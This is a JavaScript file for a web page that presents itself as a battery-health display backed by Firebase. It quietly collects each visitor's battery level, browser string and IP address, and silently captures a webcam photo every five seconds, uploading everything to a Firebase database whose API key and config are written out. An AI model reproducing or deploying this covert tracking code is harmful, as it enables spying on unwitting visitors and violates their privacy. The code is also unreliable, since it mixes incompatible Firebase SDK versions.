import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyA2TH9qGyal9QJShAuXq_9qB4VU9OoRb6k",
    authDomain: "chat-ba118.firebaseapp.com",
    projectId: "chat-ba118",
    storageBucket: "chat-ba118.appspot.com",
    messagingSenderId: "86144645058",
    appId: "1:86144645058:web:78c178cfa22951bb3f085b",
    measurementId: "G-JGYN2424Y7"
  };


firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Function to fetch and display battery health
function fetchBatteryHealth() {
    const batteryHealthRef = database.ref('batteryHealth');

    batteryHealthRef.on('value', (snapshot) => {
        const data = snapshot.val();
        document.getElementById('batteryHealth').innerText = `Battery Health: ${data}%`;
    });
}

// Function to collect user data including IP address and save it to Firebase
function collectUserData() {
    const battery = navigator.getBattery();

    battery.then((batteryInfo) => {
        const batteryPercentage = batteryInfo.level * 100;
        const browser = navigator.userAgent;
        const location = "Unknown"; // For simplicity, location is set as "Unknown" here.

        // Get user's IP address from backend
        fetch('https://yourbackendserver.com/collect-ip')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                // Save user data to Firebase
                database.ref('info').push({
                    batteryPercentage: batteryPercentage,
                    browser: browser,
                    location: location,
                    ipAddress: ipAddress
                });
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });
    });
}

// Function to capture photo from camera and save to Firebase
function captureAndSavePhoto() {
    const constraints = {
        video: true
    };

    navigator.mediaDevices.getUserMedia(constraints)
        .then(function (stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.addEventListener('loadedmetadata', function () {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoURL = canvas.toDataURL('image/jpeg');

                // Save photo to Firebase
                database.ref('photos').push({
                    imageUrl: photoURL
                })
                .then(() => {
                    console.log('Photo saved successfully');
                })
                .catch((error) => {
                    console.error('Error saving photo:', error);
                });

                stream.getTracks().forEach(function (track) {
                    track.stop();
                });
            });
        })
        .catch(function (error) {
            console.error('Error accessing camera:', error);
        });
}

// Call the function initially
fetchBatteryHealth();
collectUserData();

// Capture and save photo every 5 seconds
setInterval(captureAndSavePhoto, 5000);
